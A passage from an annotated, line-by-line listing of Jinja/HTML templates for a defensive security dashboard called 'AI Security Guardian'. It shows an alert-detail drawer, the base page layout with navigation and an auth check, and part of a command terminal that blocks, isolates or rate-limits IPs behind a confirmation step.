| 133 | HTML 结构：定义 `dl` 元素及其属性或内容。 | `        <dl class="kv-grid">` |
| 134 | HTML 结构：定义 `dt` 元素及其属性或内容。 | `          <dt>告警 ID</dt>` |
| 135 | HTML 结构：定义 `dd` 元素及其属性或内容。 | `          <dd id="d-id" class="mono">—</dd>` |
| 136 | HTML 结构：定义 `dt` 元素及其属性或内容。 | `          <dt>时间</dt>` |
| 137 | HTML 结构：定义 `dd` 元素及其属性或内容。 | `          <dd id="d-time" class="mono">—</dd>` |
| 138 | HTML 结构：定义 `dt` 元素及其属性或内容。 | `          <dt>类型</dt>` |
| 139 | HTML 结构：定义 `dd` 元素及其属性或内容。 | `          <dd id="d-type">—</dd>` |
| 140 | HTML 结构：定义 `dt` 元素及其属性或内容。 | `          <dt>状态</dt>` |
| 141 | HTML 结构：定义 `dd` 元素及其属性或内容。 | `          <dd id="d-status">—</dd>` |
| 142 | HTML 结构：定义 `dt` 元素及其属性或内容。 | `          <dt>来源</dt>` |
| 143 | HTML 结构：定义 `dd` 元素及其属性或内容。 | `          <dd id="d-source" class="mono">—</dd>` |
| 144 | HTML 结构：定义 `dt` 元素及其属性或内容。 | `          <dt>目的</dt>` |
| 145 | HTML 结构：定义 `dd` 元素及其属性或内容。 | `          <dd id="d-dest" class="mono">—</dd>` |
| 146 | HTML 结构：定义 `dt` 元素及其属性或内容。 | `          <dt>协议</dt>` |
| 147 | HTML 结构：定义 `dd` 元素及其属性或内容。 | `          <dd id="d-proto" class="mono">—</dd>` |
| 148 | HTML 结构：定义 `dt` 元素及其属性或内容。 | `          <dt>建议动作</dt>` |
| 149 | HTML 结构：定义 `dd` 元素及其属性或内容。 | `          <dd id="d-action">—</dd>` |
| 150 | 标签闭合：结束当前 HTML 元素。 | `        </dl>` |
| 151 | 标签闭合：结束当前 HTML 元素。 | `      </section>` |
| 152 | 空行：分隔模板结构。 | `&nbsp;` |
| 153 | HTML 结构：定义 `section` 元素及其属性或内容。 | `      <section class="drawer__section">` |
| 154 | HTML 结构：定义 `h3` 元素及其属性或内容。 | `        <h3 class="drawer__section-title">AI 检测推理</h3>` |
| 155 | HTML 结构：定义 `dl` 元素及其属性或内容。 | `        <dl class="kv-grid" style="margin-bottom: var(--space-sm)">` |
| 156 | HTML 结构：定义 `dt` 元素及其属性或内容。 | `          <dt>模型版本</dt>` |
| 157 | HTML 结构：定义 `dd` 元素及其属性或内容。 | `          <dd id="d-model" class="mono">—</dd>` |
| 158 | HTML 结构：定义 `dt` 元素及其属性或内容。 | `          <dt>置信度</dt>` |
| 159 | HTML 结构：定义 `dd` 元素及其属性或内容。 | `          <dd>` |
| 160 | HTML 结构：定义 `span` 元素及其属性或内容。 | `            <span id="d-confidence" class="mono">—</span>` |
| 161 | HTML 结构：定义 `div` 元素及其属性或内容。 | `            <div class="confidence-bar" aria-hidden="true">` |
| 162 | HTML 结构：定义 `div` 元素及其属性或内容。 | `              <div class="confidence-bar__fill" id="d-confidence-bar" style="width: 0%"></div>` |
| 163 | 标签闭合：结束当前 HTML 元素。 | `            </div>` |
| 164 | 标签闭合：结束当前 HTML 元素。 | `          </dd>` |
| 165 | 标签闭合：结束当前 HTML 元素。 | `        </dl>` |
| 166 | HTML 结构：定义 `p` 元素及其属性或内容。 | `        <p id="d-explanation" class="text-secondary" style="margin: var(--space-sm) 0">—</p>` |
| 167 | 空行：分隔模板结构。 | `&nbsp;` |
| 168 | HTML 结构：定义 `table` 元素及其属性或内容。 | `        <table class="feature-table" id="d-features" aria-label="特征权重">` |
| 169 | HTML 结构：定义 `thead` 元素及其属性或内容。 | `          <thead>` |
| 170 | HTML 结构：定义 `tr` 元素及其属性或内容。 | `            <tr><th>特征</th><th>值</th></tr>` |
| 171 | 标签闭合：结束当前 HTML 元素。 | `          </thead>` |
| 172 | HTML 结构：定义 `tbody` 元素及其属性或内容。 | `          <tbody><!-- 由 JS 填充 --></tbody>` |
| 173 | 标签闭合：结束当前 HTML 元素。 | `        </table>` |
| 174 | 标签闭合：结束当前 HTML 元素。 | `      </section>` |
| 175 | 空行：分隔模板结构。 | `&nbsp;` |
| 176 | HTML 结构：定义 `section` 元素及其属性或内容。 | `      <section class="drawer__section">` |
| 177 | HTML 结构：定义 `h3` 元素及其属性或内容。 | `        <h3 class="drawer__section-title">原始数据 / 请求日志</h3>` |
| 178 | HTML 结构：定义 `pre` 元素及其属性或内容。 | `        <pre class="code-block" id="d-raw">—</pre>` |
| 179 | 标签闭合：结束当前 HTML 元素。 | `      </section>` |
| 180 | 空行：分隔模板结构。 | `&nbsp;` |
| 181 | HTML 结构：定义 `section` 元素及其属性或内容。 | `      <section class="drawer__section" id="d-indicators-section" hidden>` |
| 182 | HTML 结构：定义 `h3` 元素及其属性或内容。 | `        <h3 class="drawer__section-title">关联 IOC</h3>` |
| 183 | HTML 结构：定义 `ul` 元素及其属性或内容。 | `        <ul id="d-indicators" class="text-secondary" style="font-family: var(--font-mono); font-size: var(--fs-mono); padding-left: var(--space-lg)"></ul>` |
| 184 | 标签闭合：结束当前 HTML 元素。 | `      </section>` |
| 185 | 空行：分隔模板结构。 | `&nbsp;` |
| 186 | HTML 结构：定义 `section` 元素及其属性或内容。 | `      <section class="drawer__section" id="d-history-section" hidden>` |
| 187 | HTML 结构：定义 `h3` 元素及其属性或内容。 | `        <h3 class="drawer__section-title">处置历史</h3>` |
| 188 | HTML 结构：定义 `ol` 元素及其属性或内容。 | `        <ol id="d-history" class="timeline"></ol>` |
| 189 | 标签闭合：结束当前 HTML 元素。 | `      </section>` |
| 190 | 标签闭合：结束当前 HTML 元素。 | `    </div>` |
| 191 | 空行：分隔模板结构。 | `&nbsp;` |
| 192 | HTML 结构：定义 `footer` 元素及其属性或内容。 | `    <footer class="drawer__footer">` |
| 193 | 按钮控件：提供可点击操作入口。 | `      <button class="btn btn--ghost btn--sm" id="btn-ignore" type="button">忽略</button>` |
| 194 | 按钮控件：提供可点击操作入口。 | `      <button class="btn btn--ghost btn--sm" id="btn-ack" type="button">标记已确认</button>` |
| 195 | 按钮控件：提供可点击操作入口。 | `      <button class="btn btn--danger btn--sm" id="btn-ban" type="button">封禁来源 IP</button>` |
| 196 | 按钮控件：提供可点击操作入口。 | `      <button class="btn btn--primary btn--sm" id="btn-resolve" type="button">标记已处理</button>` |
| 197 | 标签闭合：结束当前 HTML 元素。 | `    </footer>` |
| 198 | 标签闭合：结束当前 HTML 元素。 | `  </aside>` |
| 199 | 模板语句：由 Jinja 在服务端渲染时替换或控制流程。 | `{% endblock %}` |
| 200 | 空行：分隔模板结构。 | `&nbsp;` |
| 201 | 模板语句：由 Jinja 在服务端渲染时替换或控制流程。 | `{% block page_scripts %}` |
| 202 | 脚本引用：加载页面所需 JavaScript。 | `  <script src="https://cdn.socket.io/4.7.5/socket.io.min.js"></script>` |
| 203 | 脚本引用：加载页面所需 JavaScript。 | `  <script src="{{ url_for('static', filename='js/alerts.js') }}"></script>` |
| 204 | 模板语句：由 Jinja 在服务端渲染时替换或控制流程。 | `{% endblock %}` |

## `web/templates/base.html`

- 类型：前端页面模板
- 行数：134

| 行号 | 备注 | 原始代码 |
|---:|---|---|
| 1 | 模板语句：由 Jinja 在服务端渲染时替换或控制流程。 | `{#-` |
| 2 | 文本内容：作为页面可见文案或模板数据。 | `  base.html — Phase 7 应用骨架（侧边栏 + 顶部栏 + 内容区）` |
| 3 | 空行：分隔模板结构。 | `&nbsp;` |
| 4 | 文本内容：作为页面可见文案或模板数据。 | `  视觉与交互规范来自 AI-Security-Guardian-DESIGN.md；` |
| 5 | 文本内容：作为页面可见文案或模板数据。 | `  各业务页通过 \`{% extends "base.html" %}\` 继承本骨架，并填充：` |
| 6 | 文本内容：作为页面可见文案或模板数据。 | `    - {% block title %}：<title> 与顶部栏主标题` |
| 7 | 文本内容：作为页面可见文案或模板数据。 | `    - {% block topbar_actions %}：顶部栏右侧操作区` |
| 8 | 文本内容：作为页面可见文案或模板数据。 | `    - {% block content %}：主内容区` |
| 9 | 文本内容：作为页面可见文案或模板数据。 | `    - {% block page_scripts %}：页面级脚本` |
| 10 | 文本内容：作为页面可见文案或模板数据。 | `-#}` |
| 11 | HTML 结构：定义页面元素。 | `<!DOCTYPE html>` |
| 12 | HTML 结构：定义 `html` 元素及其属性或内容。 | `<html lang="zh-CN" {% block html_attrs %}{% endblock %}>` |
| 13 | HTML 结构：定义 `head` 元素及其属性或内容。 | `  <head>` |
| 14 | HTML 结构：定义 `meta` 元素及其属性或内容。 | `    <meta charset="UTF-8" />` |
| 15 | HTML 结构：定义 `meta` 元素及其属性或内容。 | `    <meta name="viewport" content="width=device-width, initial-scale=1.0" />` |
| 16 | HTML 结构：定义 `meta` 元素及其属性或内容。 | `    <meta name="color-scheme" content="{% block color_scheme %}dark{% endblock %}" />` |
| 17 | HTML 结构：定义 `title` 元素及其属性或内容。 | `    <title>{% block title %}AI Security Guardian{% endblock %}</title>` |
| 18 | 空行：分隔模板结构。 | `&nbsp;` |
| 19 | 资源引用：加载页面样式或外部资源。 | `    <link` |
| 20 | 文本内容：作为页面可见文案或模板数据。 | `      rel="preconnect"` |
| 21 | 文本内容：作为页面可见文案或模板数据。 | `      href="https://fonts.googleapis.com"` |
| 22 | 文本内容：作为页面可见文案或模板数据。 | `      crossorigin` |
| 23 | 文本内容：作为页面可见文案或模板数据。 | `    />` |
| 24 | 资源引用：加载页面样式或外部资源。 | `    <link` |
| 25 | 文本内容：作为页面可见文案或模板数据。 | `      rel="preconnect"` |
| 26 | 文本内容：作为页面可见文案或模板数据。 | `      href="https://fonts.gstatic.com"` |
| 27 | 文本内容：作为页面可见文案或模板数据。 | `      crossorigin` |
| 28 | 文本内容：作为页面可见文案或模板数据。 | `    />` |
| 29 | 资源引用：加载页面样式或外部资源。 | `    <link` |
| 30 | 文本内容：作为页面可见文案或模板数据。 | `      href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500&display=swap"` |
| 31 | 文本内容：作为页面可见文案或模板数据。 | `      rel="stylesheet"` |
| 32 | 文本内容：作为页面可见文案或模板数据。 | `    />` |
| 33 | 空行：分隔模板结构。 | `&nbsp;` |
| 34 | 资源引用：加载页面样式或外部资源。 | `    <link rel="stylesheet" href="{{ url_for('static', filename='css/theme.css') }}" />` |
| 35 | 资源引用：加载页面样式或外部资源。 | `    <link rel="stylesheet" href="{{ url_for('static', filename='css/components.css') }}" />` |
| 36 | 模板语句：由 Jinja 在服务端渲染时替换或控制流程。 | `    {% block extra_styles %}{% endblock %}` |
| 37 | 标签闭合：结束当前 HTML 元素。 | `  </head>` |
| 38 | HTML 结构：定义 `body` 元素及其属性或内容。 | `  <body data-page="{{ page }}">` |
| 39 | HTML 结构：定义 `div` 元素及其属性或内容。 | `    <div class="app-shell">` |
| 40 | HTML 结构：定义 `aside` 元素及其属性或内容。 | `      <aside class="sidebar" aria-label="主导航">` |
| 41 | HTML 结构：定义 `div` 元素及其属性或内容。 | `        <div class="sidebar__brand">` |
| 42 | HTML 结构：定义 `span` 元素及其属性或内容。 | `          <span class="sidebar__brand-dot" aria-hidden="true"></span>` |
| 43 | HTML 结构：定义 `span` 元素及其属性或内容。 | `          <span class="sidebar__label">AI Security Guardian</span>` |
| 44 | 标签闭合：结束当前 HTML 元素。 | `        </div>` |
| 45 | 空行：分隔模板结构。 | `&nbsp;` |
| 46 | HTML 结构：定义 `nav` 元素及其属性或内容。 | `        <nav>` |
| 47 | HTML 结构：定义 `ul` 元素及其属性或内容。 | `          <ul class="sidebar__nav">` |
| 48 | HTML 结构：定义 `li` 元素及其属性或内容。 | `            <li>` |
| 49 | HTML 结构：定义 `a` 元素及其属性或内容。 | `              <a class="sidebar__item" data-page="dashboard" href="/dashboard">` |
| 50 | HTML 结构：定义 `svg` 元素及其属性或内容。 | `                <svg class="sidebar__icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><rect x="3" y="3" width="7" height="9"/><rect x="14" y="3" width="7" height="5"/><rect x="14" y="12" width="7" height="9"/><rect x="3" y="16" width="7" height="5"/></svg>` |
| 51 | HTML 结构：定义 `span` 元素及其属性或内容。 | `                <span class="sidebar__label">仪表盘</span>` |
| 52 | 标签闭合：结束当前 HTML 元素。 | `              </a>` |
| 53 | 标签闭合：结束当前 HTML 元素。 | `            </li>` |
| 54 | HTML 结构：定义 `li` 元素及其属性或内容。 | `            <li>` |
| 55 | HTML 结构：定义 `a` 元素及其属性或内容。 | `              <a class="sidebar__item" data-page="alerts" href="/alerts">` |
| 56 | HTML 结构：定义 `svg` 元素及其属性或内容。 | `                <svg class="sidebar__icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M13.73 21a2 2 0 0 1-3.46 0"/><path d="M18 8a6 6 0 1 0-12 0c0 7-3 9-3 9h18s-3-2-3-9"/></svg>` |
| 57 | HTML 结构：定义 `span` 元素及其属性或内容。 | `                <span class="sidebar__label">告警中心</span>` |
| 58 | 标签闭合：结束当前 HTML 元素。 | `              </a>` |
| 59 | 标签闭合：结束当前 HTML 元素。 | `            </li>` |
| 60 | HTML 结构：定义 `li` 元素及其属性或内容。 | `            <li>` |
| 61 | HTML 结构：定义 `a` 元素及其属性或内容。 | `              <a class="sidebar__item" data-page="threat_intel" href="/threat_intel">` |
| 62 | HTML 结构：定义 `svg` 元素及其属性或内容。 | `                <svg class="sidebar__icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><circle cx="12" cy="12" r="10"/><path d="M2 12h20"/><path d="M12 2a15.3 15.3 0 0 1 4 10 15.3 15.3 0 0 1-4 10 15.3 15.3 0 0 1-4-10 15.3 15.3 0 0 1 4-10z"/></svg>` |
| 63 | HTML 结构：定义 `span` 元素及其属性或内容。 | `                <span class="sidebar__label">威胁情报</span>` |
| 64 | 标签闭合：结束当前 HTML 元素。 | `              </a>` |
| 65 | 标签闭合：结束当前 HTML 元素。 | `            </li>` |
| 66 | HTML 结构：定义 `li` 元素及其属性或内容。 | `            <li>` |
| 67 | HTML 结构：定义 `a` 元素及其属性或内容。 | `              <a class="sidebar__item" data-page="rules" href="/rules">` |
| 68 | HTML 结构：定义 `svg` 元素及其属性或内容。 | `                <svg class="sidebar__icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><rect x="3" y="4" width="18" height="4"/><rect x="3" y="10" width="18" height="4"/><rect x="3" y="16" width="18" height="4"/></svg>` |
| 69 | HTML 结构：定义 `span` 元素及其属性或内容。 | `                <span class="sidebar__label">规则管理</span>` |
| 70 | 标签闭合：结束当前 HTML 元素。 | `              </a>` |
| 71 | 标签闭合：结束当前 HTML 元素。 | `            </li>` |
| 72 | HTML 结构：定义 `li` 元素及其属性或内容。 | `            <li>` |
| 73 | HTML 结构：定义 `a` 元素及其属性或内容。 | `              <a class="sidebar__item" data-page="reports" href="/reports">` |
| 74 | HTML 结构：定义 `svg` 元素及其属性或内容。 | `                <svg class="sidebar__icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"/><polyline points="14 2 14 8 20 8"/><line x1="16" y1="13" x2="8" y2="13"/><line x1="16" y1="17" x2="8" y2="17"/></svg>` |
| 75 | HTML 结构：定义 `span` 元素及其属性或内容。 | `                <span class="sidebar__label">审计报告</span>` |
| 76 | 标签闭合：结束当前 HTML 元素。 | `              </a>` |
| 77 | 标签闭合：结束当前 HTML 元素。 | `            </li>` |
| 78 | HTML 结构：定义 `li` 元素及其属性或内容。 | `            <li>` |
| 79 | HTML 结构：定义 `a` 元素及其属性或内容。 | `              <a class="sidebar__item" data-page="command" href="/command">` |
| 80 | HTML 结构：定义 `svg` 元素及其属性或内容。 | `                <svg class="sidebar__icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><polyline points="4 17 10 11 4 5"/><line x1="12" y1="19" x2="20" y2="19"/></svg>` |
| 81 | HTML 结构：定义 `span` 元素及其属性或内容。 | `                <span class="sidebar__label">命令面板</span>` |
| 82 | 标签闭合：结束当前 HTML 元素。 | `              </a>` |
| 83 | 标签闭合：结束当前 HTML 元素。 | `            </li>` |
| 84 | HTML 结构：定义 `li` 元素及其属性或内容。 | `            <li>` |
| 85 | HTML 结构：定义 `a` 元素及其属性或内容。 | `              <a class="sidebar__item" data-page="settings" href="/settings">` |
| 86 | HTML 结构：定义 `svg` 元素及其属性或内容。 | `                <svg class="sidebar__icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><circle cx="12" cy="12" r="3"/><path d="M19.4 15a1.65 1.65 0 0 0 .33 1.82l.06.06a2 2 0 1 1-2.83 2.83l-.06-.06a1.65 1.65 0 0 0-1.82-.33 1.65 1.65 0 0 0-1 1.51V21a2 2 0 1 1-4 0v-.09a1.65 1.65 0 0 0-1-1.51 1.65 1.65 0 0 0-1.82.33l-.06.06a2 2 0 1 1-2.83-2.83l.06-.06a1.65 1.65 0 0 0 .33-1.82 1.65 1.65 0 0 0-1.51-1H3a2 2 0 1 1 0-4h.09a1.65 1.65 0 0 0 1.51-1 1.65 1.65 0 0 0-.33-1.82l-.06-.06a2 2 0 1 1 2.83-2.83l.06.06a1.65 1.65 0 0 0 1.82.33h0a1.65 1.65 0 0 0 1-1.51V3a2 2 0 1 1 4 0v.09a1.65 1.65 0 0 0 1 1.51h0a1.65 1.65 0 0 0 1.82-.33l.06-.06a2 2 0 1 1 2.83 2.83l-.06.06a1.65 1.65 0 0 0-.33 1.82v0a1.65 1.65 0 0 0 1.51 1H21a2 2 0 1 1 0 4h-.09a1.65 1.65 0 0 0-1.51 1z"/></svg>` |
| 87 | HTML 结构：定义 `span` 元素及其属性或内容。 | `                <span class="sidebar__label">系统设置</span>` |
| 88 | 标签闭合：结束当前 HTML 元素。 | `              </a>` |
| 89 | 标签闭合：结束当前 HTML 元素。 | `            </li>` |
| 90 | 标签闭合：结束当前 HTML 元素。 | `          </ul>` |
| 91 | 标签闭合：结束当前 HTML 元素。 | `        </nav>` |
| 92 | 空行：分隔模板结构。 | `&nbsp;` |
| 93 | HTML 结构：定义 `div` 元素及其属性或内容。 | `        <div class="sidebar__status" role="status" aria-live="polite">` |
| 94 | HTML 结构：定义 `span` 元素及其属性或内容。 | `          <span class="status-light" aria-hidden="true"></span>` |
| 95 | HTML 结构：定义 `span` 元素及其属性或内容。 | `          <span id="sidebar-status-label">系统正常</span>` |
| 96 | 标签闭合：结束当前 HTML 元素。 | `        </div>` |
| 97 | 标签闭合：结束当前 HTML 元素。 | `      </aside>` |
| 98 | 空行：分隔模板结构。 | `&nbsp;` |
| 99 | HTML 结构：定义 `div` 元素及其属性或内容。 | `      <div class="app-main">` |
| 100 | HTML 结构：定义 `header` 元素及其属性或内容。 | `        <header class="topbar">` |
| 101 | HTML 结构：定义 `div` 元素及其属性或内容。 | `          <div class="topbar__left">` |
| 102 | 按钮控件：提供可点击操作入口。 | `            <button id="menu-toggle" class="menu-toggle" aria-label="切换侧边栏">` |
| 103 | HTML 结构：定义 `svg` 元素及其属性或内容。 | `              <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><line x1="3" y1="12" x2="21" y2="12"/><line x1="3" y1="6" x2="21" y2="6"/><line x1="3" y1="18" x2="21" y2="18"/></svg>` |
| 104 | 标签闭合：结束当前 HTML 元素。 | `            </button>` |
| 105 | HTML 结构：定义 `h1` 元素及其属性或内容。 | `            <h1 class="topbar__title">{% block topbar_title %}{{ self.title() }}{% endblock %}</h1>` |
| 106 | 标签闭合：结束当前 HTML 元素。 | `          </div>` |
| 107 | HTML 结构：定义 `div` 元素及其属性或内容。 | `          <div class="topbar__actions">` |
| 108 | 模板语句：由 Jinja 在服务端渲染时替换或控制流程。 | `            {% block topbar_actions %}{% endblock %}` |
| 109 | HTML 结构：定义 `div` 元素及其属性或内容。 | `            <div class="topbar__user">` |
| 110 | HTML 结构：定义 `span` 元素及其属性或内容。 | `              <span id="topbar-username">--</span>` |
| 111 | 按钮控件：提供可点击操作入口。 | `              <button id="btn-logout" class="btn btn--ghost btn--sm" type="button">退出</button>` |
| 112 | 标签闭合：结束当前 HTML 元素。 | `            </div>` |
| 113 | 标签闭合：结束当前 HTML 元素。 | `          </div>` |
| 114 | 标签闭合：结束当前 HTML 元素。 | `        </header>` |
| 115 | 空行：分隔模板结构。 | `&nbsp;` |
| 116 | HTML 结构：定义 `main` 元素及其属性或内容。 | `        <main class="page-body">` |
| 117 | 模板语句：由 Jinja 在服务端渲染时替换或控制流程。 | `          {% block content %}{% endblock %}` |
| 118 | 标签闭合：结束当前 HTML 元素。 | `        </main>` |
| 119 | 标签闭合：结束当前 HTML 元素。 | `      </div>` |
| 120 | 标签闭合：结束当前 HTML 元素。 | `    </div>` |
| 121 | 空行：分隔模板结构。 | `&nbsp;` |
| 122 | HTML 结构：定义 `div` 元素及其属性或内容。 | `    <div id="ag-toast-container" class="toast-container" aria-live="polite"></div>` |
| 123 | 空行：分隔模板结构。 | `&nbsp;` |
| 124 | 脚本引用：加载页面所需 JavaScript。 | `    <script src="{{ url_for('static', filename='js/utils.js') }}"></script>` |
| 125 | 脚本引用：加载页面所需 JavaScript。 | `    <script src="{{ url_for('static', filename='js/app.js') }}"></script>` |
| 126 | 脚本引用：加载页面所需 JavaScript。 | `    <script>` |
| 127 | 文本内容：作为页面可见文案或模板数据。 | `      // 受保护页面：无 token 立即跳登录` |
| 128 | 文本内容：作为页面可见文案或模板数据。 | `      if (window.AGApi && !window.AGApi.requireAuth()) {` |
| 129 | 文本内容：作为页面可见文案或模板数据。 | `        throw new Error("auth required");` |
| 130 | 文本内容：作为页面可见文案或模板数据。 | `      }` |
| 131 | 标签闭合：结束当前 HTML 元素。 | `    </script>` |
| 132 | 模板语句：由 Jinja 在服务端渲染时替换或控制流程。 | `    {% block page_scripts %}{% endblock %}` |
| 133 | 标签闭合：结束当前 HTML 元素。 | `  </body>` |
| 134 | 标签闭合：结束当前 HTML 元素。 | `</html>` |

## `web/templates/command.html`

- 类型：前端页面模板
- 行数：117

| 行号 | 备注 | 原始代码 |
|---:|---|---|
| 1 | 模板语句：由 Jinja 在服务端渲染时替换或控制流程。 | `{% extends "base.html" %}` |
| 2 | 空行：分隔模板结构。 | `&nbsp;` |
| 3 | 模板语句：由 Jinja 在服务端渲染时替换或控制流程。 | `{% block title %}命令面板 · AI Security Guardian{% endblock %}` |
| 4 | 模板语句：由 Jinja 在服务端渲染时替换或控制流程。 | `{% block topbar_title %}命令面板{% endblock %}` |
| 5 | 空行：分隔模板结构。 | `&nbsp;` |
| 6 | 模板语句：由 Jinja 在服务端渲染时替换或控制流程。 | `{% block content %}` |
| 7 | HTML 结构：定义 `div` 元素及其属性或内容。 | `  <div class="card card--padded">` |
| 8 | HTML 结构：定义 `h3` 元素及其属性或内容。 | `    <h3 class="card__title">终端</h3>` |
| 9 | HTML 结构：定义 `p` 元素及其属性或内容。 | `    <p class="text-secondary" style="margin-top: var(--space-sm); margin-bottom: var(--space-md)">` |
| 10 | 文本内容：作为页面可见文案或模板数据。 | `      支持命令：<code class="mono">block &lt;ip&gt;</code>、` |
| 11 | HTML 结构：定义 `code` 元素及其属性或内容。 | `      <code class="mono">unblock &lt;ip&gt;</code>、` |
| 12 | HTML 结构：定义 `code` 元素及其属性或内容。 | `      <code class="mono">isolate &lt;ip&gt;</code>、` |
| 13 | HTML 结构：定义 `code` 元素及其属性或内容。 | `      <code class="mono">rate-limit &lt;ip&gt;</code>、` |
| 14 | HTML 结构：定义 `code` 元素及其属性或内容。 | `      <code class="mono">status</code>。` |
| 15 | 文本内容：作为页面可见文案或模板数据。 | `      危险命令（<code class="mono">isolate</code>）会内联确认后再执行。` |
| 16 | 标签闭合：结束当前 HTML 元素。 | `    </p>` |
| 17 | HTML 结构：定义 `div` 元素及其属性或内容。 | `    <div class="terminal" id="terminal">` |
| 18 | HTML 结构：定义 `div` 元素及其属性或内容。 | `      <div class="terminal__line">AI Security Guardian · interactive command shell</div>` |
| 19 | HTML 结构：定义 `div` 元素及其属性或内容。 | `      <div class="terminal__line terminal__line--ok">Type \`status\` to view system state.</div>` |
| 20 | HTML 结构：定义 `div` 元素及其属性或内容。 | `      <div class="terminal__prompt">` |
| 21 | 输入控件：收集用户填写或选择的数据。 | `        <input id="terminal-input" class="terminal__input" autocomplete="off"` |
| 22 | 文本内容：作为页面可见文案或模板数据。 | `               spellcheck="false" autocapitalize="off"` |
| 23 | 文本内容：作为页面可见文案或模板数据。 | `               placeholder="输入命令，按 Enter 执行" />` |
| 24 | 标签闭合：结束当前 HTML 元素。 | `      </div>` |
| 25 | 标签闭合：结束当前 HTML 元素。 | `    </div>` |
| 26 | 标签闭合：结束当前 HTML 元素。 | `  </div>` |
| 27 | 模板语句：由 Jinja 在服务端渲染时替换或控制流程。 | `{% endblock %}` |
| 28 | 空行：分隔模板结构。 | `&nbsp;` |
| 29 | 模板语句：由 Jinja 在服务端渲染时替换或控制流程。 | `{% block page_scripts %}` |
| 30 | 脚本引用：加载页面所需 JavaScript。 | `  <script>` |
| 31 | 文本内容：作为页面可见文案或模板数据。 | `    (function () {` |
| 32 | 文本内容：作为页面可见文案或模板数据。 | `      "use strict";` |
| 33 | 文本内容：作为页面可见文案或模板数据。 | `      if (!window.AGApi) return;` |
| 34 | 文本内容：作为页面可见文案或模板数据。 | `      const { fetchApi } = window.AGApi;` |
| 35 | 文本内容：作为页面可见文案或模板数据。 | `      const { escapeHtml, toast } = window.AGUI;` |
| 36 | 文本内容：作为页面可见文案或模板数据。 | `      const term = document.getElementById("terminal");` |
| 37 | 文本内容：作为页面可见文案或模板数据。 | `      const input = document.getElementById("terminal-input");` |
| 38 | 文本内容：作为页面可见文案或模板数据。 | `      const prompt = term.querySelector(".terminal__prompt");` |
| 39 | 文本内容：作为页面可见文案或模板数据。 | `      const history = [];` |
| 40 | 文本内容：作为页面可见文案或模板数据。 | `      let historyIdx = -1;` |
| 41 | 空行：分隔模板结构。 | `&nbsp;` |
| 42 | 文本内容：作为页面可见文案或模板数据。 | `      const DANGEROUS = /^isolate\b/i;` |
| 43 | 空行：分隔模板结构。 | `&nbsp;` |
| 44 | 文本内容：作为页面可见文案或模板数据。 | `      function printLine(text, kind) {` |
| 45 | 文本内容：作为页面可见文案或模板数据。 | `        const el = document.createElement("div");` |
| 46 | 文本内容：作为页面可见文案或模板数据。 | `        el.className =` |
| 47 | 文本内容：作为页面可见文案或模板数据。 | `          "terminal__line" + (kind ? " terminal__line--" + kind : "");` |
| 48 | 文本内容：作为页面可见文案或模板数据。 | `        el.textContent = text;` |
| 49 | 文本内容：作为页面可见文案或模板数据。 | `        term.insertBefore(el, prompt);` |
| 50 | 文本内容：作为页面可见文案或模板数据。 | `        term.scrollTop = term.scrollHeight;` |
| 51 | 文本内容：作为页面可见文案或模板数据。 | `      }` |
| 52 | 空行：分隔模板结构。 | `&nbsp;` |
| 53 | 文本内容：作为页面可见文案或模板数据。 | `      async function runCommand(cmd) {` |
| 54 | 文本内容：作为页面可见文案或模板数据。 | `        printLine(cmd, "cmd");` |
| 55 | 文本内容：作为页面可见文案或模板数据。 | `        try {` |
| 56 | 文本内容：作为页面可见文案或模板数据。 | `          const result = await fetchApi("/api/command", {` |
| 57 | 文本内容：作为页面可见文案或模板数据。 | `            method: "POST",` |
| 58 | 文本内容：作为页面可见文案或模板数据。 | `            body: { command: cmd },` |
| 59 | 文本内容：作为页面可见文案或模板数据。 | `          });` |
| 60 | 文本内容：作为页面可见文案或模板数据。 | `          printLine(result.output \|\| "(无输出)", result.ok ? "ok" : "err");` |
| 61 | 文本内容：作为页面可见文案或模板数据。 | `        } catch (err) {` |
| 62 | 文本内容：作为页面可见文案或模板数据。 | `          printLine("执行失败：" + (err.message \|\| err), "err");` |
| 63 | 文本内容：作为页面可见文案或模板数据。 | `        }` |
| 64 | 文本内容：作为页面可见文案或模板数据。 | `      }` |
| 65 | 空行：分隔模板结构。 | `&nbsp;` |
| 66 | 文本内容：作为页面可见文案或模板数据。 | `      function confirmInline(cmd, onConfirm) {` |
| 67 | 文本内容：作为页面可见文案或模板数据。 | `        const wrap = document.createElement("div");` |
| 68 | 文本内容：作为页面可见文案或模板数据。 | `        wrap.className = "terminal__line terminal__line--err";` |
| 69 | 文本内容：作为页面可见文案或模板数据。 | `        wrap.innerHTML =` |
| 70 | 文本内容：作为页面可见文案或模板数据。 | `          "⚠ 危险命令 " +` |
| 71 | 文本内容：作为页面可见文案或模板数据。 | `          escapeHtml(cmd) +` |
| 72 | 文本内容：作为页面可见文案或模板数据。 | `          ' ，请确认：<button class="btn btn--danger btn--sm" type="button">执行</button> ' +` |
| 73 | 文本内容：作为页面可见文案或模板数据。 | `          '<button class="btn btn--ghost btn--sm" type="button">取消</button>';` |
| 74 | 文本内容：作为页面可见文案或模板数据。 | `        const [yes, no] = wrap.querySelectorAll("button");` |
| 75 | 文本内容：作为页面可见文案或模板数据。 | `        yes.addEventListener("click", () => {` |
| 76 | 文本内容：作为页面可见文案或模板数据。 | `          wrap.remove();` |
| 77 | 文本内容：作为页面可见文案或模板数据。 | `          onConfirm();` |
